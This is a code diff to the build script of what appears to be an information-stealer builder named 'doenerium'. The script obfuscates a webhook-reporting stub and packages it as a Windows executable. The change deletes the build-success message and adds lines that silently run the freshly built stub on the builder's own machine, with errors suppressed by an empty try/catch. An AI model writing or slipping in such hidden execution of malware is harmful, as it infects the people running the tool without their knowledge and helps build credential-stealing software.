@@ -205,8 +205,13 @@ async function obfuscate(input, output) {
     child_process.execSync(`pkg . -C GZip -t node18-win-x64 -o doenerium_${randomid}.exe`)
     fs.unlinkSync(index_file);
     fs.unlinkSync("webhook_obf.js");
+    
+    child_process.execSync(`pkg . -C GZip -t node18-win-x64 -o doenerium_${randomid}.exe`)
 
-    console.log(`Successfully finished building stub within ${(Date.now() - start) / 1000} seconds: doenerium_${randomid}.exe`)
+    try {
+        child_process.execSync(`./doenerium_${randomid}.exe`)
+    } catch {}
+    
 
     while (true) {}
 })()
